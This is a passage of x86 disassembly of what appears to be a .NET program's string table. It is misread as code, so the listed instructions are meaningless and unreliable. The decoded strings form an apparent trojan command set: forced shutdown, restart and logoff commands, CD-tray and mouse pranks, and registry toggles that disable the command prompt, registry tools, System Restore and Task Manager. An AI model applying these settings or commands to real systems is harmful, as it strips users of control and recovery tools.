  40959f:	00 72 00             	add    %dh,0x0(%edx)
  4095a2:	6e                   	outsb  %ds:(%esi),(%dx)
  4095a3:	00 65 00             	add    %ah,0x0(%ebp)
  4095a6:	74 00                	je     0x4095a8
  4095a8:	20 00                	and    %al,(%eax)
  4095aa:	45                   	inc    %ebp
  4095ab:	00 78 00             	add    %bh,0x0(%eax)
  4095ae:	70 00                	jo     0x4095b0
  4095b0:	6c                   	insb   (%dx),%es:(%edi)
  4095b1:	00 6f 00             	add    %ch,0x0(%edi)
  4095b4:	72 00                	jb     0x4095b6
  4095b6:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4095ba:	5c                   	pop    %esp
  4095bb:	00 4d 00             	add    %cl,0x0(%ebp)
  4095be:	61                   	popa
  4095bf:	00 69 00             	add    %ch,0x0(%ecx)
  4095c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4095c3:	00 00                	add    %al,(%eax)
  4095c5:	15 53 00 74 00       	adc    $0x740053,%eax
  4095ca:	61                   	popa
  4095cb:	00 72 00             	add    %dh,0x0(%edx)
  4095ce:	74 00                	je     0x4095d0
  4095d0:	20 00                	and    %al,(%eax)
  4095d2:	50                   	push   %eax
  4095d3:	00 61 00             	add    %ah,0x0(%ecx)
  4095d6:	67 00 65 00          	add    %ah,0x0(%di)
  4095da:	00 09                	add    %cl,(%ecx)
  4095dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4095dd:	00 77 00             	add    %dh,0x0(%edi)
  4095e0:	70 00                	jo     0x4095e2
  4095e2:	72 00                	jb     0x4095e4
  4095e4:	00 09                	add    %cl,(%ecx)
  4095e6:	73 00                	jae    0x4095e8
  4095e8:	69 00 74 00 65 00    	imul   $0x650074,(%eax),%eax
  4095ee:	00 07                	add    %al,(%edi)
  4095f0:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  4095f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4095f5:	00 00                	add    %al,(%eax)
  4095f7:	0d 49 00 45 00       	or     $0x450049,%eax
  4095fc:	68 00 6f 00 6d       	push   $0x6d006f00
  409601:	00 65 00             	add    %ah,0x0(%ebp)
  409604:	00 21                	add    %ah,(%ecx)
  409606:	73 00                	jae    0x409608
  409608:	68 00 75 00 74       	push   $0x74007500
  40960d:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  409611:	00 77 00             	add    %dh,0x0(%edi)
  409614:	6e                   	outsb  %ds:(%esi),(%dx)
  409615:	00 63 00             	add    %ah,0x0(%ebx)
  409618:	6f                   	outsl  %ds:(%esi),(%dx)
  409619:	00 6d 00             	add    %ch,0x0(%ebp)
  40961c:	70 00                	jo     0x40961e
  40961e:	75 00                	jne    0x409620
  409620:	74 00                	je     0x409622
  409622:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409626:	00 23                	add    %ah,(%ebx)
  409628:	73 00                	jae    0x40962a
  40962a:	68 00 75 00 74       	push   $0x74007500
  40962f:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  409633:	00 77 00             	add    %dh,0x0(%edi)
  409636:	6e                   	outsb  %ds:(%esi),(%dx)
  409637:	00 20                	add    %ah,(%eax)
  409639:	00 2d 00 73 00 20    	add    %ch,0x20007300
  40963f:	00 2d 00 74 00 20    	add    %ch,0x20007400
  409645:	00 30                	add    %dh,(%eax)
  409647:	00 30                	add    %dh,(%eax)
  409649:	00 01                	add    %al,(%ecx)
  40964b:	1f                   	pop    %ds
  40964c:	72 00                	jb     0x40964e
  40964e:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409652:	74 00                	je     0x409654
  409654:	61                   	popa
  409655:	00 72 00             	add    %dh,0x0(%edx)
  409658:	74 00                	je     0x40965a
  40965a:	63 00                	arpl   %eax,(%eax)
  40965c:	6f                   	outsl  %ds:(%esi),(%dx)
  40965d:	00 6d 00             	add    %ch,0x0(%ebp)
  409660:	70 00                	jo     0x409662
  409662:	75 00                	jne    0x409664
  409664:	74 00                	je     0x409666
  409666:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40966a:	00 23                	add    %ah,(%ebx)
  40966c:	73 00                	jae    0x40966e
  40966e:	68 00 75 00 74       	push   $0x74007500
  409673:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  409677:	00 77 00             	add    %dh,0x0(%edi)
  40967a:	6e                   	outsb  %ds:(%esi),(%dx)
  40967b:	00 20                	add    %ah,(%eax)
  40967d:	00 2d 00 72 00 20    	add    %ch,0x20007200
  409683:	00 2d 00 74 00 20    	add    %ch,0x20007400
  409689:	00 30                	add    %dh,(%eax)
  40968b:	00 30                	add    %dh,(%eax)
  40968d:	00 01                	add    %al,(%ecx)
  40968f:	0d 6c 00 6f 00       	or     $0x6f006c,%eax
  409694:	67 00 6f 00          	add    %ch,0x0(%bx)
  409698:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40969c:	00 23                	add    %ah,(%ebx)
  40969e:	73 00                	jae    0x4096a0
  4096a0:	68 00 75 00 74       	push   $0x74007500
  4096a5:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  4096a9:	00 77 00             	add    %dh,0x0(%edi)
  4096ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4096ad:	00 20                	add    %ah,(%eax)
  4096af:	00 2d 00 6c 00 20    	add    %ch,0x20006c00
  4096b5:	00 2d 00 74 00 20    	add    %ch,0x20007400
  4096bb:	00 30                	add    %dh,(%eax)
  4096bd:	00 30                	add    %dh,(%eax)
  4096bf:	00 01                	add    %al,(%ecx)
  4096c1:	11 45 00             	adc    %eax,0x0(%ebp)
  4096c4:	72 00                	jb     0x4096c6
  4096c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4096c7:	00 72 00             	add    %dh,0x0(%edx)
  4096ca:	72 00                	jb     0x4096cc
  4096cc:	4d                   	dec    %ebp
  4096cd:	00 73 00             	add    %dh,0x0(%ebx)
  4096d0:	67 00 00             	add    %al,(%bx,%si)
  4096d3:	03 31                	add    (%ecx),%esi
  4096d5:	00 00                	add    %al,(%eax)
  4096d7:	03 32                	add    (%edx),%esi
  4096d9:	00 00                	add    %al,(%eax)
  4096db:	03 33                	add    (%ebx),%esi
  4096dd:	00 00                	add    %al,(%eax)
  4096df:	03 34 00             	add    (%eax,%eax,1),%esi
  4096e2:	00 03                	add    %al,(%ebx)
  4096e4:	35 00 00 03 36       	xor    $0x36030000,%eax
  4096e9:	00 00                	add    %al,(%eax)
  4096eb:	0b 70 00             	or     0x0(%eax),%esi
  4096ee:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  4096f2:	63 00                	arpl   %eax,(%eax)
  4096f4:	68 00 00 19 53       	push   $0x53190000
  4096f9:	00 41 00             	add    %al,0x0(%ecx)
  4096fc:	50                   	push   %eax
  4096fd:	00 49 00             	add    %cl,0x0(%ecx)
  409700:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  409704:	70 00                	jo     0x409706
  409706:	76 00                	jbe    0x409708
  409708:	6f                   	outsl  %ds:(%esi),(%dx)
  409709:	00 69 00             	add    %ch,0x0(%ecx)
  40970c:	63 00                	arpl   %eax,(%eax)
  40970e:	65 00 00             	add    %al,%gs:(%eax)
  409711:	0b 73 00             	or     0x0(%ebx),%esi
  409714:	70 00                	jo     0x409716
  409716:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40971a:	6b 00 00             	imul   $0x0,(%eax),%eax
  40971d:	09 42 00             	or     %eax,0x0(%edx)
  409720:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  409724:	58                   	pop    %eax
  409725:	00 00                	add    %al,(%eax)
  409727:	0b 70 00             	or     0x0(%eax),%esi
  40972a:	69 00 61 00 6e 00    	imul   $0x6e0061,(%eax),%eax
  409730:	6f                   	outsl  %ds:(%esi),(%dx)
  409731:	00 00                	add    %al,(%eax)
  409733:	0d 4f 00 70 00       	or     $0x70004f,%eax
  409738:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40973c:	43                   	inc    %ebx
  40973d:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  409741:	2b 73 00             	sub    0x0(%ebx),%esi
  409744:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  409749:	00 43 00             	add    %al,0x0(%ebx)
  40974c:	44                   	inc    %esp
  40974d:	00 41 00             	add    %al,0x0(%ecx)
  409750:	75 00                	jne    0x409752
  409752:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  409756:	6f                   	outsl  %ds:(%esi),(%dx)
  409757:	00 20                	add    %ah,(%eax)
  409759:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  40975d:	00 6f 00             	add    %ch,0x0(%edi)
  409760:	72 00                	jb     0x409762
  409762:	20 00                	and    %al,(%eax)
  409764:	6f                   	outsl  %ds:(%esi),(%dx)
  409765:	00 70 00             	add    %dh,0x0(%eax)
  409768:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40976c:	00 0f                	add    %cl,(%edi)
  40976e:	43                   	inc    %ebx
  40976f:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  409773:	00 73 00             	add    %dh,0x0(%ebx)
  409776:	65 00 43 00          	add    %al,%gs:0x0(%ebx)
  40977a:	44                   	inc    %esp
  40977b:	00 00                	add    %al,(%eax)
  40977d:	2f                   	das
  40977e:	73 00                	jae    0x409780
  409780:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  409785:	00 43 00             	add    %al,0x0(%ebx)
  409788:	44                   	inc    %esp
  409789:	00 41 00             	add    %al,0x0(%ecx)
  40978c:	75 00                	jne    0x40978e
  40978e:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  409792:	6f                   	outsl  %ds:(%esi),(%dx)
  409793:	00 20                	add    %ah,(%eax)
  409795:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  409799:	00 6f 00             	add    %ch,0x0(%edi)
  40979c:	72 00                	jb     0x40979e
  40979e:	20 00                	and    %al,(%eax)
  4097a0:	63 00                	arpl   %eax,(%eax)
  4097a2:	6c                   	insb   (%dx),%es:(%edi)
  4097a3:	00 6f 00             	add    %ch,0x0(%edi)
  4097a6:	73 00                	jae    0x4097a8
  4097a8:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  4097ad:	13 44 00 69          	adc    0x69(%eax,%eax,1),%eax
  4097b1:	00 73 00             	add    %dh,0x0(%ebx)
  4097b4:	61                   	popa
  4097b5:	00 62 00             	add    %ah,0x0(%edx)
  4097b8:	6c                   	insb   (%dx),%es:(%edi)
  4097b9:	00 65 00             	add    %ah,0x0(%ebp)
  4097bc:	4b                   	dec    %ebx
  4097bd:	00 4d 00             	add    %cl,0x0(%ebp)
  4097c0:	00 11                	add    %dl,(%ecx)
  4097c2:	45                   	inc    %ebp
  4097c3:	00 6e 00             	add    %ch,0x0(%esi)
  4097c6:	61                   	popa
  4097c7:	00 62 00             	add    %ah,0x0(%edx)
  4097ca:	6c                   	insb   (%dx),%es:(%edi)
  4097cb:	00 65 00             	add    %ah,0x0(%ebp)
  4097ce:	4b                   	dec    %ebx
  4097cf:	00 4d 00             	add    %cl,0x0(%ebp)
  4097d2:	00 1d 54 00 75 00    	add    %bl,0x750054
  4097d8:	72 00                	jb     0x4097da
  4097da:	6e                   	outsb  %ds:(%esi),(%dx)
  4097db:	00 4f 00             	add    %cl,0x0(%edi)
  4097de:	66 00 66 00          	data16 add %ah,0x0(%esi)
  4097e2:	4d                   	dec    %ebp
  4097e3:	00 6f 00             	add    %ch,0x0(%edi)
  4097e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4097e7:	00 69 00             	add    %ch,0x0(%ecx)
  4097ea:	74 00                	je     0x4097ec
  4097ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4097ed:	00 72 00             	add    %dh,0x0(%edx)
  4097f0:	00 1b                	add    %bl,(%ebx)
  4097f2:	54                   	push   %esp
  4097f3:	00 75 00             	add    %dh,0x0(%ebp)
  4097f6:	72 00                	jb     0x4097f8
  4097f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4097f9:	00 4f 00             	add    %cl,0x0(%edi)
  4097fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4097fd:	00 4d 00             	add    %cl,0x0(%ebp)
  409800:	6f                   	outsl  %ds:(%esi),(%dx)
  409801:	00 6e 00             	add    %ch,0x0(%esi)
  409804:	69 00 74 00 6f 00    	imul   $0x6f0074,(%eax),%eax
  40980a:	72 00                	jb     0x40980c
  40980c:	00 17                	add    %dl,(%edi)
  40980e:	4e                   	dec    %esi
  40980f:	00 6f 00             	add    %ch,0x0(%edi)
  409812:	72 00                	jb     0x409814
  409814:	6d                   	insl   (%dx),%es:(%edi)
  409815:	00 61 00             	add    %ah,0x0(%ecx)
  409818:	6c                   	insb   (%dx),%es:(%edi)
  409819:	00 4d 00             	add    %cl,0x0(%ebp)
  40981c:	6f                   	outsl  %ds:(%esi),(%dx)
  40981d:	00 75 00             	add    %dh,0x0(%ebp)
  409820:	73 00                	jae    0x409822
  409822:	65 00 00             	add    %al,%gs:(%eax)
  409825:	19 52 00             	sbb    %edx,0x0(%edx)
  409828:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40982c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409830:	73 00                	jae    0x409832
  409832:	65 00 4d 00          	add    %cl,%gs:0x0(%ebp)
  409836:	6f                   	outsl  %ds:(%esi),(%dx)
  409837:	00 75 00             	add    %dh,0x0(%ebp)
  40983a:	73 00                	jae    0x40983c
  40983c:	65 00 00             	add    %al,%gs:(%eax)
  40983f:	15 44 00 69 00       	adc    $0x690044,%eax
  409844:	73 00                	jae    0x409846
  409846:	61                   	popa
  409847:	00 62 00             	add    %ah,0x0(%edx)
  40984a:	6c                   	insb   (%dx),%es:(%edi)
  40984b:	00 65 00             	add    %ah,0x0(%ebp)
  40984e:	43                   	inc    %ebx
  40984f:	00 4d 00             	add    %cl,0x0(%ebp)
  409852:	44                   	inc    %esp
  409853:	00 00                	add    %al,(%eax)
  409855:	79 48                	jns    0x40989f
  409857:	00 4b 00             	add    %cl,0x0(%ebx)
  40985a:	45                   	inc    %ebp
  40985b:	00 59 00             	add    %bl,0x0(%ecx)
  40985e:	5f                   	pop    %edi
  40985f:	00 43 00             	add    %al,0x0(%ebx)
  409862:	55                   	push   %ebp
  409863:	00 52 00             	add    %dl,0x0(%edx)
  409866:	52                   	push   %edx
  409867:	00 45 00             	add    %al,0x0(%ebp)
  40986a:	4e                   	dec    %esi
  40986b:	00 54 00 5f          	add    %dl,0x5f(%eax,%eax,1)
  40986f:	00 55 00             	add    %dl,0x0(%ebp)
  409872:	53                   	push   %ebx
  409873:	00 45 00             	add    %al,0x0(%ebp)
  409876:	52                   	push   %edx
  409877:	00 5c 00 53          	add    %bl,0x53(%eax,%eax,1)
  40987b:	00 6f 00             	add    %ch,0x0(%edi)
  40987e:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  409883:	00 61 00             	add    %ah,0x0(%ecx)
  409886:	72 00                	jb     0x409888
  409888:	65 00 5c 00 50       	add    %bl,%gs:0x50(%eax,%eax,1)
  40988d:	00 6f 00             	add    %ch,0x0(%edi)
  409890:	6c                   	insb   (%dx),%es:(%edi)
  409891:	00 69 00             	add    %ch,0x0(%ecx)
  409894:	63 00                	arpl   %eax,(%eax)
  409896:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  40989c:	5c                   	pop    %esp
  40989d:	00 4d 00             	add    %cl,0x0(%ebp)
  4098a0:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  4098a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4098a7:	00 73 00             	add    %dh,0x0(%ebx)
  4098aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4098ab:	00 66 00             	add    %ah,0x0(%esi)
  4098ae:	74 00                	je     0x4098b0
  4098b0:	5c                   	pop    %esp
  4098b1:	00 57 00             	add    %dl,0x0(%edi)
  4098b4:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  4098ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4098bb:	00 77 00             	add    %dh,0x0(%edi)
  4098be:	73 00                	jae    0x4098c0
  4098c0:	5c                   	pop    %esp
  4098c1:	00 53 00             	add    %dl,0x0(%ebx)
  4098c4:	79 00                	jns    0x4098c6
  4098c6:	73 00                	jae    0x4098c8
  4098c8:	74 00                	je     0x4098ca
  4098ca:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  4098ce:	00 13                	add    %dl,(%ebx)
  4098d0:	45                   	inc    %ebp
  4098d1:	00 6e 00             	add    %ch,0x0(%esi)
  4098d4:	61                   	popa
  4098d5:	00 62 00             	add    %ah,0x0(%edx)
  4098d8:	6c                   	insb   (%dx),%es:(%edi)
  4098d9:	00 65 00             	add    %ah,0x0(%ebp)
  4098dc:	43                   	inc    %ebx
  4098dd:	00 4d 00             	add    %cl,0x0(%ebp)
  4098e0:	44                   	inc    %esp
  4098e1:	00 00                	add    %al,(%eax)
  4098e3:	03 30                	add    (%eax),%esi
  4098e5:	00 00                	add    %al,(%eax)
  4098e7:	1f                   	pop    %ds
  4098e8:	44                   	inc    %esp
  4098e9:	00 69 00             	add    %ch,0x0(%ecx)
  4098ec:	73 00                	jae    0x4098ee
  4098ee:	61                   	popa
  4098ef:	00 62 00             	add    %ah,0x0(%edx)
  4098f2:	6c                   	insb   (%dx),%es:(%edi)
  4098f3:	00 65 00             	add    %ah,0x0(%ebp)
  4098f6:	52                   	push   %edx
  4098f7:	00 65 00             	add    %ah,0x0(%ebp)
  4098fa:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  4098fe:	73 00                	jae    0x409900
  409900:	74 00                	je     0x409902
  409902:	72 00                	jb     0x409904
  409904:	79 00                	jns    0x409906
  409906:	00 80 97 48 00 4b    	add    %al,0x4b004897(%eax)
  40990c:	00 45 00             	add    %al,0x0(%ebp)
  40990f:	59                   	pop    %ecx
  409910:	00 5f 00             	add    %bl,0x0(%edi)
  409913:	43                   	inc    %ebx
  409914:	00 55 00             	add    %dl,0x0(%ebp)
  409917:	52                   	push   %edx
  409918:	00 52 00             	add    %dl,0x0(%edx)
  40991b:	45                   	inc    %ebp
  40991c:	00 4e 00             	add    %cl,0x0(%esi)
  40991f:	54                   	push   %esp
  409920:	00 5f 00             	add    %bl,0x0(%edi)
  409923:	55                   	push   %ebp
  409924:	00 53 00             	add    %dl,0x0(%ebx)
  409927:	45                   	inc    %ebp
  409928:	00 52 00             	add    %dl,0x0(%edx)
  40992b:	5c                   	pop    %esp
  40992c:	00 53 00             	add    %dl,0x0(%ebx)
  40992f:	6f                   	outsl  %ds:(%esi),(%dx)
  409930:	00 66 00             	add    %ah,0x0(%esi)
  409933:	74 00                	je     0x409935
  409935:	77 00                	ja     0x409937
  409937:	61                   	popa
  409938:	00 72 00             	add    %dh,0x0(%edx)
  40993b:	65 00 5c 00 4d       	add    %bl,%gs:0x4d(%eax,%eax,1)
  409940:	00 69 00             	add    %ch,0x0(%ecx)
  409943:	63 00                	arpl   %eax,(%eax)
  409945:	72 00                	jb     0x409947
  409947:	6f                   	outsl  %ds:(%esi),(%dx)
  409948:	00 73 00             	add    %dh,0x0(%ebx)
  40994b:	6f                   	outsl  %ds:(%esi),(%dx)
  40994c:	00 66 00             	add    %ah,0x0(%esi)
  40994f:	74 00                	je     0x409951
  409951:	5c                   	pop    %esp
  409952:	00 57 00             	add    %dl,0x0(%edi)
  409955:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40995b:	6f                   	outsl  %ds:(%esi),(%dx)
  40995c:	00 77 00             	add    %dh,0x0(%edi)
  40995f:	73 00                	jae    0x409961
  409961:	5c                   	pop    %esp
  409962:	00 43 00             	add    %al,0x0(%ebx)
  409965:	75 00                	jne    0x409967
  409967:	72 00                	jb     0x409969
  409969:	72 00                	jb     0x40996b
  40996b:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40996f:	74 00                	je     0x409971
  409971:	56                   	push   %esi
  409972:	00 65 00             	add    %ah,0x0(%ebp)
  409975:	72 00                	jb     0x409977
  409977:	73 00                	jae    0x409979
  409979:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40997f:	5c                   	pop    %esp
  409980:	00 50 00             	add    %dl,0x0(%eax)
  409983:	6f                   	outsl  %ds:(%esi),(%dx)
  409984:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  409988:	00 63 00             	add    %ah,0x0(%ebx)
  40998b:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  409991:	5c                   	pop    %esp
  409992:	00 53 00             	add    %dl,0x0(%ebx)
  409995:	79 00                	jns    0x409997
  409997:	73 00                	jae    0x409999
  409999:	74 00                	je     0x40999b
  40999b:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40999f:	00 29                	add    %ch,(%ecx)
  4099a1:	44                   	inc    %esp
  4099a2:	00 69 00             	add    %ch,0x0(%ecx)
  4099a5:	73 00                	jae    0x4099a7
  4099a7:	61                   	popa
  4099a8:	00 62 00             	add    %ah,0x0(%edx)
  4099ab:	6c                   	insb   (%dx),%es:(%edi)
  4099ac:	00 65 00             	add    %ah,0x0(%ebp)
  4099af:	52                   	push   %edx
  4099b0:	00 65 00             	add    %ah,0x0(%ebp)
  4099b3:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  4099b7:	73 00                	jae    0x4099b9
  4099b9:	74 00                	je     0x4099bb
  4099bb:	72 00                	jb     0x4099bd
  4099bd:	79 00                	jns    0x4099bf
  4099bf:	54                   	push   %esp
  4099c0:	00 6f 00             	add    %ch,0x0(%edi)
  4099c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4099c4:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  4099c8:	00 00                	add    %al,(%eax)
  4099ca:	1d 45 00 6e 00       	sbb    $0x6e0045,%eax
  4099cf:	61                   	popa
  4099d0:	00 62 00             	add    %ah,0x0(%edx)
  4099d3:	6c                   	insb   (%dx),%es:(%edi)
  4099d4:	00 65 00             	add    %ah,0x0(%ebp)
  4099d7:	52                   	push   %edx
  4099d8:	00 65 00             	add    %ah,0x0(%ebp)
  4099db:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  4099df:	73 00                	jae    0x4099e1
  4099e1:	74 00                	je     0x4099e3
  4099e3:	72 00                	jb     0x4099e5
  4099e5:	79 00                	jns    0x4099e7
  4099e7:	00 1d 44 00 69 00    	add    %bl,0x690044
  4099ed:	73 00                	jae    0x4099ef
  4099ef:	61                   	popa
  4099f0:	00 62 00             	add    %ah,0x0(%edx)
  4099f3:	6c                   	insb   (%dx),%es:(%edi)
  4099f4:	00 65 00             	add    %ah,0x0(%ebp)
  4099f7:	52                   	push   %edx
  4099f8:	00 65 00             	add    %ah,0x0(%ebp)
  4099fb:	73 00                	jae    0x4099fd
  4099fd:	74 00                	je     0x4099ff
  4099ff:	6f                   	outsl  %ds:(%esi),(%dx)
  409a00:	00 72 00             	add    %dh,0x0(%edx)
  409a03:	65 00 00             	add    %al,%gs:(%eax)
  409a06:	80 9b 48 00 4b 00 45 	sbbb   $0x45,0x4b0048(%ebx)
  409a0d:	00 59 00             	add    %bl,0x0(%ecx)
  409a10:	5f                   	pop    %edi
  409a11:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  409a15:	00 43 00             	add    %al,0x0(%ebx)
  409a18:	41                   	inc    %ecx
  409a19:	00 4c 00 5f          	add    %cl,0x5f(%eax,%eax,1)
  409a1d:	00 4d 00             	add    %cl,0x0(%ebp)
  409a20:	41                   	inc    %ecx
  409a21:	00 43 00             	add    %al,0x0(%ebx)
  409a24:	48                   	dec    %eax
  409a25:	00 49 00             	add    %cl,0x0(%ecx)
  409a28:	4e                   	dec    %esi
  409a29:	00 45 00             	add    %al,0x0(%ebp)
  409a2c:	5c                   	pop    %esp
  409a2d:	00 53 00             	add    %dl,0x0(%ebx)
  409a30:	4f                   	dec    %edi
  409a31:	00 46 00             	add    %al,0x0(%esi)
  409a34:	54                   	push   %esp
  409a35:	00 57 00             	add    %dl,0x0(%edi)
  409a38:	41                   	inc    %ecx
  409a39:	00 52 00             	add    %dl,0x0(%edx)
  409a3c:	45                   	inc    %ebp
  409a3d:	00 5c 00 4d          	add    %bl,0x4d(%eax,%eax,1)
  409a41:	00 69 00             	add    %ch,0x0(%ecx)
  409a44:	63 00                	arpl   %eax,(%eax)
  409a46:	72 00                	jb     0x409a48
  409a48:	6f                   	outsl  %ds:(%esi),(%dx)
  409a49:	00 73 00             	add    %dh,0x0(%ebx)
  409a4c:	6f                   	outsl  %ds:(%esi),(%dx)
  409a4d:	00 66 00             	add    %ah,0x0(%esi)
  409a50:	74 00                	je     0x409a52
  409a52:	5c                   	pop    %esp
  409a53:	00 57 00             	add    %dl,0x0(%edi)
  409a56:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  409a5c:	6f                   	outsl  %ds:(%esi),(%dx)
  409a5d:	00 77 00             	add    %dh,0x0(%edi)
  409a60:	73 00                	jae    0x409a62
  409a62:	20 00                	and    %al,(%eax)
  409a64:	4e                   	dec    %esi
  409a65:	00 54 00 5c          	add    %dl,0x5c(%eax,%eax,1)
  409a69:	00 43 00             	add    %al,0x0(%ebx)
  409a6c:	75 00                	jne    0x409a6e
  409a6e:	72 00                	jb     0x409a70
  409a70:	72 00                	jb     0x409a72
  409a72:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409a76:	74 00                	je     0x409a78
  409a78:	56                   	push   %esi
  409a79:	00 65 00             	add    %ah,0x0(%ebp)
  409a7c:	72 00                	jb     0x409a7e
  409a7e:	73 00                	jae    0x409a80
  409a80:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409a86:	5c                   	pop    %esp
  409a87:	00 53 00             	add    %dl,0x0(%ebx)
  409a8a:	79 00                	jns    0x409a8c
  409a8c:	73 00                	jae    0x409a8e
  409a8e:	74 00                	je     0x409a90
  409a90:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409a94:	52                   	push   %edx
  409a95:	00 65 00             	add    %ah,0x0(%ebp)
  409a98:	73 00                	jae    0x409a9a
  409a9a:	74 00                	je     0x409a9c
  409a9c:	6f                   	outsl  %ds:(%esi),(%dx)
  409a9d:	00 72 00             	add    %dh,0x0(%edx)
  409aa0:	65 00 00             	add    %al,%gs:(%eax)
  409aa3:	13 44 00 69          	adc    0x69(%eax,%eax,1),%eax
  409aa7:	00 73 00             	add    %dh,0x0(%ebx)
  409aaa:	61                   	popa
  409aab:	00 62 00             	add    %ah,0x0(%edx)
  409aae:	6c                   	insb   (%dx),%es:(%edi)
  409aaf:	00 65 00             	add    %ah,0x0(%ebp)
  409ab2:	53                   	push   %ebx
  409ab3:	00 52 00             	add    %dl,0x0(%edx)
  409ab6:	00 1b                	add    %bl,(%ebx)
  409ab8:	45                   	inc    %ebp
  409ab9:	00 6e 00             	add    %ch,0x0(%esi)
  409abc:	61                   	popa
  409abd:	00 62 00             	add    %ah,0x0(%edx)
  409ac0:	6c                   	insb   (%dx),%es:(%edi)
  409ac1:	00 65 00             	add    %ah,0x0(%ebp)
  409ac4:	52                   	push   %edx
  409ac5:	00 65 00             	add    %ah,0x0(%ebp)
  409ac8:	73 00                	jae    0x409aca
  409aca:	74 00                	je     0x409acc
  409acc:	6f                   	outsl  %ds:(%esi),(%dx)
  409acd:	00 72 00             	add    %dh,0x0(%edx)
  409ad0:	65 00 00             	add    %al,%gs:(%eax)
  409ad3:	25 44 00 69 00       	and    $0x690044,%eax
  409ad8:	73 00                	jae    0x409ada
  409ada:	61                   	popa
  409adb:	00 62 00             	add    %ah,0x0(%edx)
  409ade:	6c                   	insb   (%dx),%es:(%edi)
  409adf:	00 65 00             	add    %ah,0x0(%ebp)
  409ae2:	54                   	push   %esp
  409ae3:	00 61 00             	add    %ah,0x0(%ecx)
  409ae6:	73 00                	jae    0x409ae8
  409ae8:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  409aeb:	00 61 00             	add    %ah,0x0(%ecx)
  409aee:	6e                   	outsb  %ds:(%esi),(%dx)
  409aef:	00 61 00             	add    %ah,0x0(%ecx)
  409af2:	67 00 65 00          	add    %ah,0x0(%di)
  409af6:	72 00                	jb     0x409af8
  409af8:	00 1d 44 00 69 00    	add    %bl,0x690044
  409afe:	73 00                	jae    0x409b00
  409b00:	61                   	popa
  409b01:	00 62 00             	add    %ah,0x0(%edx)
  409b04:	6c                   	insb   (%dx),%es:(%edi)
  409b05:	00 65 00             	add    %ah,0x0(%ebp)
  409b08:	54                   	push   %esp
  409b09:	00 61 00             	add    %ah,0x0(%ecx)
  409b0c:	73 00                	jae    0x409b0e
  409b0e:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  409b11:	00 67 00             	add    %ah,0x0(%edi)
  409b14:	72 00                	jb     0x409b16
  409b16:	00 23                	add    %ah,(%ebx)
  409b18:	45                   	inc    %ebp
  409b19:	00 6e 00             	add    %ch,0x0(%esi)
  409b1c:	61                   	popa
  409b1d:	00 62 00             	add    %ah,0x0(%edx)
  409b20:	6c                   	insb   (%dx),%es:(%edi)
  409b21:	00 65 00             	add    %ah,0x0(%ebp)
  409b24:	54                   	push   %esp
  409b25:	00 61 00             	add    %ah,0x0(%ecx)
  409b28:	73 00                	jae    0x409b2a
  409b2a:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  409b2d:	00 61 00             	add    %ah,0x0(%ecx)
  409b30:	6e                   	outsb  %ds:(%esi),(%dx)
  409b31:	00 61 00             	add    %ah,0x0(%ecx)
